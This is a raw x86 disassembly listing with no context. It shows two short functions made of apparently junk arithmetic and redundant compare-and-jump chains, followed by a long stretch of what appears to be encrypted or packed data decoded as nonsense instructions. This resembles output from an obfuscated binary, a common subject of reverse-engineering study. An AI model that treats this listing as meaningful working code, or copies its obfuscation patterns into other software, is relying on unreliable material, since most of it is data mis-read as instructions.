  41c776:	je     0x41c783
  41c778:	add    eax,edx
  41c77a:	sub    DWORD PTR [ebp-0x24],ebx
  41c77d:	sub    DWORD PTR [ebp-0x24],eax
  41c780:	add    DWORD PTR [ebp-0x24],ecx
  41c783:	leave  
  41c784:	ret    
  41c785:	int3   
  41c786:	int3   
  41c787:	int3   
  41c788:	int3   
  41c789:	int3   
  41c78a:	push   ebp
  41c78b:	mov    ebp,esp
  41c78d:	sub    esp,0x1c
  41c790:	mov    eax,0x22
  41c795:	mov    edx,0xd
  41c79a:	add    edx,eax
  41c79c:	sub    edx,eax
  41c79e:	mov    DWORD PTR [ebp-0x8],eax
  41c7a1:	sub    DWORD PTR [ebp-0x8],edx
  41c7a4:	push   ebx
  41c7a5:	mov    eax,edx
  41c7a7:	sub    eax,edx
  41c7a9:	sub    DWORD PTR [ebp-0x8],edx
  41c7ac:	mov    edx,DWORD PTR [ebp-0x8]
  41c7af:	add    DWORD PTR [ebp-0x8],edx
  41c7b2:	sub    DWORD PTR [ebp-0x8],eax
  41c7b5:	push   esi
  41c7b6:	and    edx,eax
  41c7b8:	mov    ecx,DWORD PTR [ebp-0x8]
  41c7bb:	mov    eax,DWORD PTR [ebp-0x8]
  41c7be:	add    DWORD PTR [ebp-0x8],eax
  41c7c1:	and    edx,ecx
  41c7c3:	add    DWORD PTR [ebp-0x8],edx
  41c7c6:	push   edi
  41c7c7:	mov    eax,DWORD PTR [ebp-0x8]
  41c7ca:	cmp    eax,0x4990
  41c7cf:	je     0x41c91b
  41c7d5:	cmp    edx,DWORD PTR [ebp-0x1c]
  41c7d8:	jne    0x41c91b
  41c7de:	mov    edi,DWORD PTR [ebp-0x8]
  41c7e1:	sub    edi,eax
  41c7e3:	mov    ebx,0x8f
  41c7e8:	sub    ebx,eax
  41c7ea:	sub    ebx,ecx
  41c7ec:	mov    DWORD PTR [ebp-0x8],edi
  41c7ef:	and    ebx,edi
  41c7f1:	test   ebx,0x39
  41c7f7:	je     0x41c91b
  41c7fd:	sub    ebx,eax
  41c7ff:	sub    ebx,eax
  41c801:	sub    ebx,eax
  41c803:	cmp    eax,DWORD PTR [ebp-0x10]
  41c806:	je     0x41c91b
  41c80c:	cmp    ebx,edi
  41c80e:	jne    0x41c91b
  41c814:	mov    ecx,DWORD PTR [ebp-0x8]
  41c817:	mov    edx,0x15
  41c81c:	or     edx,eax
  41c81e:	cmp    ebx,0xffffff9a
  41c821:	jne    0x41c91b
  41c827:	add    ecx,ebx
  41c829:	mov    ebx,0x4b
  41c82e:	and    DWORD PTR [ebp-0x8],ebx
  41c831:	mov    eax,edi
  41c833:	sub    DWORD PTR [ebp-0x8],edx
  41c836:	add    DWORD PTR [ebp-0x8],eax
  41c839:	cmp    ecx,0xffffff95
  41c83c:	jne    0x41c91b
  41c842:	cmp    ecx,DWORD PTR [ebp-0x18]
  41c845:	jne    0x41c91b
  41c84b:	and    DWORD PTR [ebp-0x8],eax
  41c84e:	mov    ebx,0x2905
  41c853:	or     ebx,edi
  41c855:	cmp    ecx,0x4f
  41c858:	jne    0x41c91b
  41c85e:	cmp    ecx,eax
  41c860:	jne    0x41c91b
  41c866:	mov    eax,DWORD PTR [ebp-0x8]
  41c869:	mov    edx,0xd
  41c86e:	add    eax,edi
  41c870:	cmp    eax,0x230d4031
  41c875:	je     0x41c91b
  41c87b:	add    DWORD PTR [ebp-0x8],edx
  41c87e:	or     ebx,edi
  41c880:	sub    ebx,edi
  41c882:	mov    edi,DWORD PTR [ebp-0x8]
  41c885:	mov    esi,DWORD PTR [ebp-0x8]
  41c888:	sub    edi,esi
  41c88a:	cmp    eax,0x9dbf
  41c88f:	je     0x41c91b
  41c895:	and    ecx,esi
  41c897:	sub    ecx,ebx
  41c899:	add    DWORD PTR [ebp-0x8],eax
  41c89c:	mov    esi,DWORD PTR [ebp-0x8]
  41c89f:	mov    ebx,DWORD PTR [ebp-0x8]
  41c8a2:	add    DWORD PTR [ebp-0x8],edi
  41c8a5:	add    DWORD PTR [ebp-0x8],ebx
  41c8a8:	test   ecx,0x1b4b
  41c8ae:	je     0x41c91b
  41c8b0:	mov    ebx,edx
  41c8b2:	mov    eax,DWORD PTR [ebp-0x8]
  41c8b5:	sub    DWORD PTR [ebp-0x8],edx
  41c8b8:	and    ecx,edi
  41c8ba:	test   ecx,0xee
  41c8c0:	je     0x41c91b
  41c8c2:	mov    edx,DWORD PTR [ebp-0x8]
  41c8c5:	cmp    edx,0xffffffa4
  41c8c8:	je     0x41c91b
  41c8ca:	test   esi,0x3a
  41c8d0:	je     0x41c91b
  41c8d2:	or     DWORD PTR [ebp-0x8],ecx
  41c8d5:	cmp    eax,ecx
  41c8d7:	je     0x41c91b
  41c8d9:	xor    DWORD PTR [ebp-0x8],edx
  41c8dc:	mov    ecx,DWORD PTR [ebp-0x8]
  41c8df:	mov    edx,DWORD PTR [ebp-0x8]
  41c8e2:	and    DWORD PTR [ebp-0x8],edx
  41c8e5:	add    ecx,edx
  41c8e7:	sub    DWORD PTR [ebp-0x8],eax
  41c8ea:	or     ecx,edx
  41c8ec:	sub    DWORD PTR [ebp-0x8],edx
  41c8ef:	add    ecx,edx
  41c8f1:	or     DWORD PTR [ebp-0x8],ebx
  41c8f4:	sub    DWORD PTR [ebp-0x8],ecx
  41c8f7:	and    esi,edx
  41c8f9:	cmp    ecx,DWORD PTR [ebp-0x8]
  41c8fc:	je     0x41c91b
  41c8fe:	cmp    esi,0xffffff8e
  41c901:	jne    0x41c91b
  41c903:	mov    ecx,edi
  41c905:	sub    esi,ecx
  41c907:	mov    edx,0x5d
  41c90c:	add    DWORD PTR [ebp-0x8],edx
  41c90f:	add    esi,ebx
  41c911:	and    DWORD PTR [ebp-0x8],eax
  41c914:	add    esi,eax
  41c916:	or     esi,edx
  41c918:	add    DWORD PTR [ebp-0x8],esi
  41c91b:	sub    DWORD PTR [ebp-0x8],ebx
  41c91e:	mov    ecx,DWORD PTR [ebp-0x8]
  41c921:	cmp    ecx,eax
  41c923:	je     0x41c932
  41c925:	test   ecx,0xf3cf
  41c92b:	je     0x41c932
  41c92d:	and    ecx,edx
  41c92f:	mov    DWORD PTR [ebp-0x8],ecx
  41c932:	add    DWORD PTR [ebp-0x8],eax
  41c935:	pop    edi
  41c936:	mov    esi,0x1494
  41c93b:	mov    ecx,DWORD PTR [ebp-0x8]
  41c93e:	add    DWORD PTR [ebp-0x8],ecx
  41c941:	add    DWORD PTR [ebp-0x8],ecx
  41c944:	mov    DWORD PTR [ebp-0x8],esi
  41c947:	pop    esi
  41c948:	add    DWORD PTR [ebp-0x8],edi
  41c94b:	pop    ebx
  41c94c:	cmp    esi,ebx
  41c94e:	jne    0x41c9a2
  41c950:	sub    ecx,ebx
  41c952:	mov    edx,DWORD PTR ds:0x459eac
  41c958:	mov    eax,DWORD PTR ds:0x459ea0
  41c95e:	cmp    ecx,esi
  41c960:	jne    0x41c9a2
  41c962:	cmp    ecx,0x13
  41c965:	je     0x41c9a2
  41c967:	mov    eax,0x40
  41c96c:	cmp    esi,DWORD PTR [ebp-0x10]
  41c96f:	jne    0x41c9a2
  41c971:	add    DWORD PTR [ebp-0x8],eax
  41c974:	cmp    esi,0x8303
  41c97a:	je     0x41c9a2
  41c97c:	mov    edx,DWORD PTR [ebp-0x8]
  41c97f:	xor    DWORD PTR [ebp-0x8],ecx
  41c982:	mov    eax,0xed
  41c987:	add    DWORD PTR [ebp-0x8],edi
  41c98a:	cmp    edx,DWORD PTR ds:0x459ea0
  41c990:	je     0x41c9a2
  41c992:	mov    ecx,edi
  41c994:	sub    DWORD PTR [ebp-0x8],ecx
  41c997:	sub    eax,ecx
  41c999:	or     DWORD PTR [ebp-0x8],eax
  41c99c:	add    DWORD PTR [ebp-0x8],esi
  41c99f:	add    DWORD PTR [ebp-0x8],edx
  41c9a2:	leave  
  41c9a3:	ret    
  41c9a4:	pop    eax
  41c9a5:	jge    0x41c977
  41c9a7:	sbb    eax,0xfba0713e
  41c9ac:	neg    DWORD PTR [ebx]
  41c9ae:	out    dx,al
  41c9af:	mov    eax,ds:0x3977d009
  41c9b4:	popa   
  41c9b5:	push   es
  41c9b6:	mov    fs:0x59d98c5f,al
  41c9bc:	pop    ecx
  41c9bd:	sbb    eax,0x5554c0c6
  41c9c2:	pop    esp
  41c9c3:	inc    edi
  41c9c4:	push   ebx
  41c9c5:	inc    ebx
  41c9c6:	cmp    ebx,DWORD PTR [ecx+0x2252469e]
  41c9cc:	mov    ds:0x5ca10c7d,eax
  41c9d1:	dec    esp
  41c9d2:	and    bl,BYTE PTR [edi+0x24]
  41c9d5:	cmp    dh,BYTE PTR [esi+edx*1]
  41c9d8:	cmp    BYTE PTR [edx-0x44],cl
  41c9db:	and    BYTE PTR [edx+0x31f2419],ah
  41c9e1:	retf   0xf397
  41c9e4:	pop    ecx
  41c9e5:	pop    esp
  41c9e6:	sbb    al,0x99
  41c9e8:	mov    al,BYTE PTR [eax+eiz*4]
  41c9eb:	popa   
  41c9ec:	adc    ecx,ebx
  41c9ee:	cmp    eax,0x8e175bc5
  41c9f3:	loop   0x41c9e9
  41c9f5:	sbb    bh,BYTE PTR [ebp-0x1a]
  41c9f8:	sub    eax,0x9761ae46
  41c9fd:	dec    esp
  41c9fe:	and    eax,0x9f92a3a1
  41ca03:	int3   
  41ca04:	jmp    0x41ca56
  41ca06:	fldenv ds:0xae635a5e
  41ca0c:	(bad)
  41ca11:	inc    ecx
  41ca12:	mov    al,BYTE PTR [ebx+ebp*4-0x60]
  41ca16:	push   ds
  41ca17:	adc    eax,0xc63c566a
  41ca1c:	push   ss
  41ca1d:	cli    
  41ca1e:	jno    0x41c9c1
  41ca20:	mov    ds:0x5b082cd9,eax
  41ca25:	pop    ecx
  41ca26:	mov    eax,ds:0x9e606911
  41ca2b:	xor    al,0x11
  41ca2d:	out    0x49,al
  41ca2f:	and    BYTE PTR [esi],0x43
  41ca32:	out    dx,al
  41ca33:	jmp    0xd380:0xb953aea7
  41ca3a:	loopne 0x41c9dc
  41ca3c:	and    al,0x0
  41ca3e:	push   cs
  41ca3f:	in     eax,dx
  41ca40:	mov    dl,0xbf
  41ca42:	mov    ah,BYTE PTR [edi+0x4785505e]
  41ca48:	or     eax,esi
  41ca4a:	mov    ds:0xe360d9be,eax
  41ca4f:	xchg   ebx,eax
  41ca50:	adc    ebx,DWORD PTR [ebp+0x23]
  41ca53:	sbb    eax,0x7fee6eb6
  41ca58:	jnp    0x41ca7b
  41ca5a:	scas   al,BYTE PTR es:[di]
  41ca5c:	scas   al,BYTE PTR es:[edi]
  41ca5d:	imul   edx,DWORD PTR [edx],0xa47e50a1
  41ca63:	mov    ds:0x86221636,eax
  41ca68:	pop    esi
  41ca69:	add    dh,BYTE PTR ss:[esi-0x63]
  41ca6d:	fmul   DWORD PTR [ebp-0x409f57c8]
  41ca73:	xor    al,0xac
  41ca75:	cld    
  41ca76:	ss cli 
  41ca78:	ret    
  41ca79:	or     eax,0x4d0ee9ee
  41ca7e:	fist   WORD PTR [esi+0x17]
  41ca81:	aam    0x33
  41ca83:	mov    eax,ds:0xfb4d26f1
  41ca88:	xor    eax,0x56ba79ed
  41ca8d:	xchg   edi,eax
  41ca8e:	inc    edx
  41ca8f:	xchg   ebp,eax
  41ca90:	mov    cs,ebp
  41ca92:	push   0x2c7f64a1
  41ca97:	sub    al,0xa4
  41ca99:	or     eax,0x395e7705
  41ca9e:	sub    BYTE PTR [bp+di+0x71b0],0x8d
  41caa4:	repz pop ebp
  41caa6:	xchg   ecx,eax
  41caa7:	adc    al,0x73
  41caa9:	adc    BYTE PTR [ebp+0x67],ch
  41caac:	mov    dh,0xe5
  41caae:	xor    esi,DWORD PTR [ebp+0x1593ca65]
  41cab4:	shr    BYTE PTR [ecx+0x6a2c6eed],0xda
  41cabb:	add    ch,bh
  41cabd:	xor    ch,dh
  41cabf:	push   edx
  41cac0:	inc    esp
  41cac1:	sub    ah,cl
  41cac3:	scas   al,BYTE PTR es:[edi]
  41cac4:	retf   
  41cac5:	or     eax,0xc5a150
  41caca:	or     al,0x27
  41cacc:	jmp    0x41cb38
  41cace:	push   ecx
  41cacf:	repz pop esi
  41cad1:	dec    esp
  41cad2:	push   edi
  41cad3:	hlt    
  41cad4:	jae    0x41caf7
  41cad6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cad7:	inc    ecx
  41cad8:	dec    ebp
  41cad9:	popa   
  41cada:	loop   0x41cb33
  41cadc:	mov    eax,ds:0x8599b98e
  41cae1:	sub    esi,0x62
  41cae4:	sahf   
  41cae5:	push   ds
  41cae6:	pop    esi
  41cae7:	outs   dx,DWORD PTR ds:[esi]
  41cae8:	mov    ch,0xa8
  41caea:	and    BYTE PTR [ecx+0x325be396],0x41
  41caf1:	lods   al,BYTE PTR ds:[esi]
  41caf2:	push   eax
  41caf3:	icebp  
  41caf4:	idiv   BYTE PTR [edx]
  41caf6:	out    dx,al
  41caf7:	ja     0x41ca8b
  41caf9:	inc    eax
  41cafa:	push   0x70
  41cafc:	and    dh,dh
  41cafe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41caff:	int3   
  41cb00:	xlat   BYTE PTR ds:[ebx]
  41cb01:	ins    DWORD PTR es:[edi],dx
  41cb02:	in     al,dx
  41cb03:	test   al,0x53
  41cb05:	js     0x41cb5f
  41cb07:	pop    edi
  41cb08:	jge    0x41cb4d
  41cb0a:	fwait
  41cb0b:	popa   
  41cb0c:	out    dx,al
  41cb0d:	(bad)  
  41cb0e:	out    dx,al
  41cb0f:	adc    cl,dh
  41cb11:	adc    esi,DWORD PTR [edi+0x426e3a7e]
  41cb17:	mov    eax,ds:0x45039d87
  41cb1c:	sub    esp,DWORD PTR [edx-0x18]
  41cb1f:	jmp    0x41cb0c
  41cb21:	aam    0xee
  41cb23:	sar    DWORD PTR [edi+0x449d343a],cl
  41cb29:	push   ss
  41cb2a:	test   DWORD PTR [ecx+0x620db8c8],esp
  41cb30:	sbb    eax,0x84a1b6f5
  41cb35:	(bad)  
  41cb36:	out    dx,al
  41cb37:	in     eax,0xc9
  41cb39:	adc    ah,dl
  41cb3b:	inc    edx
  41cb3c:	loope  0x41cb16
  41cb3e:	jle    0x41cbac
  41cb40:	ds in  al,0x85
  41cb43:	mov    ds:0x16af6c95,al
  41cb48:	(bad)  
  41cb49:	mov    dl,0x2e
  41cb4b:	rcl    DWORD PTR [ebp+0x1f],0xee
  41cb4f:	popf   
  41cb50:	sbb    eax,0x58cafca3
  41cb55:	and    DWORD PTR [ecx-0x7286ce5f],0xffffffd4
  41cb5c:	xor    eax,0x5e32f23e
  41cb61:	movups XMMWORD PTR ds:0x35b97d4f,xmm3
  41cb68:	std    
  41cb69:	push   edi
  41cb6a:	(bad)  
  41cb6b:	mov    edx,0x796e0dfa
  41cb70:	push   0xffffff92
  41cb72:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cb73:	and    eax,0x89fa0d5e
  41cb78:	push   ebx
  41cb79:	dec    ebx
  41cb7a:	aaa    
  41cb7b:	mov    ds:0x2f276168,eax
  41cb80:	mov    eax,ds:0xdaab3a97
  41cb85:	shr    dh,cl
  41cb87:	inc    ebx
  41cb88:	not    BYTE PTR [eax]
  41cb8a:	dec    eax
  41cb8b:	adc    ch,BYTE PTR [edx]
  41cb8d:	dec    esp
  41cb8e:	push   ebx
  41cb8f:	pop    DWORD PTR [ebp-0x6f288ee7]
  41cb95:	pusha  
  41cb96:	inc    eax
  41cb97:	stc    
  41cb98:	sub    dh,0xe
  41cb9b:	les    edx,FWORD PTR [ebx-0x5d]
  41cb9e:	cmc    
  41cb9f:	icebp  
  41cba0:	push   ds
  41cba1:	add    DWORD PTR [eax-0x73],ebx
  41cba4:	mov    ecx,0x19a43793
  41cba9:	icebp  
  41cbaa:	sub    eax,0x8ea123b1
  41cbaf:	lods   al,BYTE PTR ds:[esi]
  41cbb0:	inc    eax
  41cbb1:	pop    edi
  41cbb2:	and    DWORD PTR [edx-0x7beca5ca],ebp
  41cbb8:	xchg   ebp,eax
  41cbb9:	sub    al,0x2e
  41cbbb:	mov    bl,0x64
  41cbbd:	shl    BYTE PTR [ecx],cl
  41cbbf:	mov    eax,ds:0xe36bbaf
  41cbc4:	sub    eax,0x5ea50bb0
  41cbc9:	arpl   WORD PTR [esi],bx
  41cbcb:	push   edi
  41cbcc:	js     0x41cb7a
  41cbce:	xor    dl,bl
  41cbd0:	xchg   ebp,eax
  41cbd1:	pop    edi
  41cbd2:	(bad)  
  41cbd3:	dec    edx
  41cbd4:	int    0xc5
  41cbd6:	sbb    al,0xd4
  41cbd8:	clc    
  41cbd9:	mov    esp,0xf2bea763
  41cbde:	cmp    al,0x7a
  41cbe0:	dec    edx
  41cbe1:	je     0x41cc08
  41cbe3:	enter  0x60da,0x38
  41cbe7:	cmp    eax,0x219bfb51
  41cbec:	test   al,0x60
  41cbee:	leave  
  41cbef:	mov    bl,0xff
  41cbf1:	mov    bh,0x7e
  41cbf3:	in     al,0x4a
  41cbf5:	xchg   ecx,eax
  41cbf6:	out    dx,al
  41cbf7:	retf   0xb00a
  41cbfa:	push   0xb29196e9
  41cbff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cc00:	rcl    DWORD PTR [ebx-0x5f86b025],1
  41cc06:	xor    eax,0x1fd5b7fc
  41cc0b:	mov    ebx,0xc6ffade8
  41cc10:	sar    DWORD PTR [edi+0x3b],cl
  41cc13:	mov    al,0x54
  41cc15:	add    ebp,DWORD PTR [esi+0x50340574]
  41cc1b:	rcl    BYTE PTR [edx+0x61],0x6a
  41cc1f:	sub    esp,ebp
  41cc21:	pop    esi
  41cc22:	add    esp,ecx
  41cc24:	ds xchg ecx,eax
  41cc26:	out    dx,al
  41cc27:	and    esi,esp
  41cc29:	inc    edx
  41cc2a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cc2b:	jne    0x41cc83
  41cc2d:	mov    eax,ds:0x5bbaa134
  41cc32:	je     0x41cbd7
  41cc34:	fs dec edi
  41cc36:	sbb    al,0xda
  41cc38:	out    dx,eax
  41cc39:	repz out dx,al
  41cc3b:	test   ah,ch
  41cc3d:	lea    edi,[edx+0x50876f4d]
  41cc43:	mov    eax,ds:0x9d59b98b
  41cc48:	lods   eax,DWORD PTR ds:[esi]
  41cc49:	xchg   edx,eax
  41cc4a:	or     ah,cl
  41cc4c:	pop    ebp
  41cc4d:	add    BYTE PTR [eax],0xc4
  41cc50:	es inc edi
  41cc52:	and    eax,0x93a57e6f
  41cc57:	scas   al,BYTE PTR es:[edi]
  41cc58:	out    0xb5,eax
  41cc5a:	outs   dx,BYTE PTR ds:[esi]
  41cc5b:	lods   eax,DWORD PTR ds:[esi]
  41cc5c:	jle    0x41cc8a
  41cc5e:	cmp    al,0xd0
  41cc60:	cmp    ecx,DWORD PTR [edx-0x11]
  41cc63:	dec    eax
  41cc64:	adc    DWORD PTR [eax+0x6a],eax
  41cc67:	test   al,0x30
  41cc69:	and    eax,0xb012624e
  41cc6e:	cli    
  41cc6f:	mov    eax,ds:0xf3212fe0
  41cc74:	retf   0x4cf6
  41cc77:	bound  ecx,QWORD PTR [ecx]
  41cc79:	xor    esp,edi
  41cc7b:	jb     0x41ccd6
  41cc7d:	cmc    
  41cc7e:	mov    bl,0xb2
  41cc80:	std    
  41cc81:	push   es
  41cc82:	or     edx,DWORD PTR cs:[eax]
  41cc85:	iret   
  41cc86:	das    
  41cc87:	mov    al,ds:0xdd3bc993
  41cc8c:	(bad)  
  41cc8d:	stc    
  41cc8e:	outs   dx,BYTE PTR ds:[esi]
  41cc8f:	sub    BYTE PTR [edi+0x7896eda3],ah
  41cc95:	pop    ss
  41cc96:	xor    al,0xbc
  41cc98:	fdiv   st(6),st
  41cc9a:	dec    edx
  41cc9b:	push   0xffffffd6
  41cc9d:	sub    BYTE PTR [ebx+0x904c3a0],bh
  41cca3:	and    BYTE PTR [ecx+0x5e3c0321],ch
  41cca9:	cmp    eax,0xa0f56db1
  41ccae:	les    ecx,FWORD PTR [eax-0x4d]
  41ccb1:	jp     0x41ccd9
  41ccb3:	and    ecx,DWORD PTR ds:0x7d6d7a67
  41ccb9:	loop   0x41cca9
  41ccbb:	push   cs
  41ccbc:	das    
  41ccbd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ccbe:	and    BYTE PTR [ebp+ebp*2+0x76e8eea6],bh
  41ccc5:	mov    esi,?
  41ccc7:	daa    
  41ccc8:	dec    eax
  41ccc9:	mov    esi,0xe8b4cbfb
  41ccce:	std    
  41cccf:	mov    al,ds:0x9095e370
  41ccd4:	lock retf 
  41ccd6:	shl    BYTE PTR [eax-0x62b94a9c],cl
  41ccdc:	sbb    al,0xd6
  41ccde:	lods   eax,DWORD PTR ds:[esi]
  41ccdf:	or     DWORD PTR [ebx-0x22],ebx
  41cce2:	xchg   esp,eax
  41cce3:	cwde   
  41cce4:	fcmovu st,st(6)
  41cce6:	pop    es
  41cce7:	xor    BYTE PTR [ebx+0x7c412eaf],bh
  41cced:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ccee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ccef:	mov    al,ds:0xedd68263
  41ccf4:	shl    DWORD PTR [esi],1
  41ccf6:	ror    DWORD PTR [ecx+0x5e],1
  41ccf9:	shl    DWORD PTR [edx+eax*8-0x74efbf91],0xd0
  41cd01:	pusha  
  41cd02:	fwait
  41cd03:	adc    dh,0x4c
  41cd06:	lods   eax,DWORD PTR ds:[esi]
  41cd07:	(bad)  
  41cd08:	adc    eax,0x5d3e54b8
  41cd0d:	mov    bh,0x12
  41cd0f:	mov    dh,0x1a
  41cd11:	pop    edx
  41cd12:	in     eax,0x74
  41cd14:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cd15:	mov    eax,0x3b4a18f
  41cd1a:	xor    DWORD PTR [esi+0x4e],0x5eeb63f7
  41cd21:	in     eax,dx
  41cd22:	xchg   edx,eax
  41cd23:	mov    esp,0x89bdc1b9
  41cd28:	(bad)  
  41cd29:	pop    ecx
  41cd2a:	mov    ch,0x1d
  41cd2c:	mov    al,0x9c
  41cd2e:	ja     0x41cd41
  41cd30:	test   al,0x95
  41cd32:	and    al,0x99
  41cd34:	aaa    
  41cd35:	daa    
  41cd36:	pop    ds
  41cd37:	and    DWORD PTR [esi+0x43],edi
  41cd3a:	iret   
  41cd3b:	push   cs
  41cd3c:	fcom   DWORD PTR [edx]
  41cd3e:	pop    esi
  41cd3f:	mov    eax,ds:0x73acaa0f
  41cd44:	mov    eax,ds:0x5eada330
  41cd49:	adc    BYTE PTR [ebp+0x5a],bl
  41cd4c:	test   BYTE PTR [edx+0x43145709],al
  41cd52:	enter  0x6546,0xa1
  41cd56:	sbb    DWORD PTR [esi],0xd8d0dab5
  41cd5c:	pop    esi
  41cd5d:	mov    cl,BYTE PTR [ecx+0x1aaee478]
  41cd63:	lea    esi,[edx]
  41cd65:	popa   
  41cd66:	stos   DWORD PTR es:[edi],eax
  41cd67:	mov    al,0x2c
  41cd69:	cli    
  41cd6a:	sahf   
  41cd6b:	sbb    ebp,0x7a53eecd
  41cd71:	lahf   
  41cd72:	push   esp
  41cd73:	mov    esp,?
  41cd75:	fnstcw WORD PTR [edx-0x690bff60]
  41cd7b:	inc    edi
  41cd7c:	cli    
  41cd7d:	ins    BYTE PTR es:[edi],dx
  41cd7e:	cwde   
  41cd7f:	dec    edi
  41cd80:	pop    esi
  41cd81:	int3   
  41cd82:	or     eax,0x64fbd1e7
  41cd87:	data16 add al,0x58
  41cd8a:	pop    esi
  41cd8b:	jns    0x41cdaf
  41cd8d:	into   
  41cd8e:	outs   dx,BYTE PTR ds:[esi]
  41cd8f:	jg     0x41cd37
  41cd91:	add    al,0x4a
  41cd93:	pop    esp
  41cd94:	pop    esi
  41cd95:	mov    WORD PTR [edx],cs
  41cd97:	mov    ebp,0x40f0d777
  41cd9c:	call   0xb1de36c3
  41cda1:	nop
  41cda2:	scas   al,BYTE PTR es:[edi]
  41cda3:	dec    esi
  41cda4:	fdivp  st(1),st
  41cda6:	sbb    DWORD PTR [eax-0xa112768],0xaa4ab653
  41cdb0:	jge    0x41cda9
  41cdb2:	xchg   DWORD PTR [eax+0x387c5c2d],ebp
  41cdb8:	push   ecx
  41cdb9:	and    DWORD PTR [esi+ecx*2+0x77eee2e7],ebx
  41cdc0:	push   esp
  41cdc1:	xchg   ecx,eax
  41cdc2:	in     al,dx
  41cdc3:	xchg   edi,eax
  41cdc4:	xlat   BYTE PTR ds:[ebx]
  41cdc5:	add    DWORD PTR [ebp-0x5eefa95e],ecx
  41cdcb:	pop    ss
  41cdcc:	and    al,0x5e
  41cdce:	or     bh,BYTE PTR [ecx-0x8]
  41cdd1:	inc    eax
  41cdd2:	out    dx,eax
  41cdd3:	gs pop ecx
  41cdd5:	call   0xb9203acb
  41cdda:	mov    esp,0x9923fa4d
  41cddf:	mov    eax,ds:0x72158806
  41cde4:	adc    eax,0xb1e253e4
  41cde9:	mov    ch,ch
  41cdeb:	js     0x41cd89
  41cded:	pop    esi
  41cdee:	mov    al,ds:0xb1e1b76c
  41cdf3:	fistp  QWORD PTR [ebp+0x2e]
  41cdf6:	jg     0x41cdd9
  41cdf8:	cdq    
  41cdf9:	add    eax,0x3b33d508
  41cdfe:	lock lods eax,DWORD PTR ds:[esi]
  41ce00:	popf   
  41ce01:	pusha  
  41ce02:	cmp    ecx,esi
  41ce04:	xchg   esi,eax
  41ce05:	(bad)  
  41ce06:	aad    0xe9
  41ce08:	arpl   WORD PTR [ecx+0x54],sp
  41ce0b:	fadd   st,st(6)
  41ce0d:	fdivr  DWORD PTR [eax-0x61]
  41ce10:	sub    DWORD PTR ds:0x32aba6eb,edx
  41ce16:	inc    edi
  41ce17:	sub    al,0xfe
  41ce19:	mov    ebp,0x541c411d
  41ce1e:	pop    ebp
  41ce1f:	test   al,0xe4
  41ce21:	dec    ebx
  41ce22:	xchg   ebx,eax
  41ce23:	mov    ch,BYTE PTR [ebx-0x73]
  41ce26:	retf   
  41ce27:	mov    eax,0x169be07b
  41ce2c:	cmp    DWORD PTR [ecx],eax
  41ce2e:	call   0x1263e1e2
  41ce33:	and    bl,BYTE PTR [esi]
  41ce35:	adc    al,0x60
  41ce37:	(bad)  
  41ce38:	mov    BYTE PTR [ecx+0x7c],cl
  41ce3b:	xor    edi,DWORD PTR [ebp+0x60]
  41ce3e:	sub    ebp,DWORD PTR [ebx+esi*4+0x505b241b]
  41ce45:	ffreep st(3)
  41ce47:	(bad)  
  41ce48:	jbe    0x41ce48
  41ce4a:	out    dx,al
  41ce4b:	xchg   edx,eax
  41ce4c:	mov    esp,0xded89aa2
  41ce51:	mov    al,ds:0x5ca13eee
  41ce56:	push   fs
  41ce58:	add    ah,ah
  41ce5a:	mov    esp,0xee6f09cc
  41ce5f:	mov    edx,DWORD PTR [esi+0x1c67fb8b]
  41ce65:	add    bh,ch
  41ce67:	fsubrp st(2),st
  41ce69:	test   eax,ebp
  41ce6b:	jae    0x41ce6e
  41ce6d:	rol    BYTE PTR [ecx-0x58],cl
  41ce70:	cmp    DWORD PTR [esi],esp
  41ce72:	sub    eax,0x17c0bb9a
  41ce77:	add    bh,dh
  41ce79:	out    0x23,al
  41ce7b:	jne    0x41ce6a
  41ce7d:	pusha  
  41ce7e:	lock inc edx
  41ce80:	ret    
  41ce81:	push   ecx
  41ce82:	push   edi
  41ce83:	cdq    
  41ce84:	xor    eax,0x590b835c
  41ce89:	es (bad) 
  41ce8b:	arpl   WORD PTR [ebx],bp
  41ce8d:	std    
  41ce8e:	outs   dx,BYTE PTR ds:[esi]
  41ce8f:	inc    edi
  41ce90:	retf   0xecf3
  41ce93:	xor    BYTE PTR [ebx+0x6d730032],ah
  41ce99:	mov    edi,0x303e6d3f
  41ce9e:	dec    edx
  41ce9f:	mov    eax,ds:0xb9cf616c
  41cea4:	rol    DWORD PTR [edi-0x1e],0x23
  41cea8:	pop    esi
  41cea9:	inc    esp
  41ceaa:	cld    
  41ceab:	cwde   
  41ceac:	cli    
  41cead:	push   cs
  41ceae:	dec    esi
  41ceaf:	lods   al,BYTE PTR ds:[esi]
  41ceb0:	sub    eax,0xb48ec61
  41ceb5:	jmp    0x78988d49
  41ceba:	out    dx,al
  41cebb:	mov    bl,0x26
  41cebd:	cmp    eax,esp
  41cebf:	arpl   WORD PTR [edx+0x7bf58b95],bx
  41cec5:	pusha  
  41cec6:	aas    
  41cec7:	jne    0x41cedb
  41cec9:	sub    al,0xd4
  41cecb:	outs   dx,BYTE PTR ds:[esi]
  41cecc:	jge    0x41cf2a
  41cece:	push   edx
  41cecf:	xchg   edi,eax
  41ced0:	pop    edi
  41ced1:	jb     0x41cf4c
  41ced3:	mov    ebx,0x4819ce8b
  41ced8:	sub    ebp,DWORD PTR [edi-0x22725efb]
  41cede:	dec    esp
  41cedf:	loope  0x41cf3b
  41cee1:	push   esi
  41cee2:	sbb    al,0x8b
  41cee4:	sbb    eax,0xf39ee02
  41cee9:	inc    esp
  41ceea:	mov    cl,0xe9
  41ceec:	dec    ebx
  41ceed:	mov    ebp,0x975f5a84
  41cef2:	aas    
  41cef3:	fstp   QWORD PTR [edi-0x2a819960]
  41cef9:	pusha  
  41cefa:	sub    al,0xb2
  41cefc:	test   eax,0x2addf13b
  41cf01:	shl    BYTE PTR [esi],1
  41cf03:	in     eax,0xc6
  41cf05:	pusha  
  41cf06:	enter  0x43f5,0x5d
  41cf0a:	xchg   edi,eax
  41cf0b:	and    DWORD PTR [ebp+0x67021f60],0x96645ca7
  41cf15:	ja     0x41cefb
  41cf17:	loope  0x41cf77
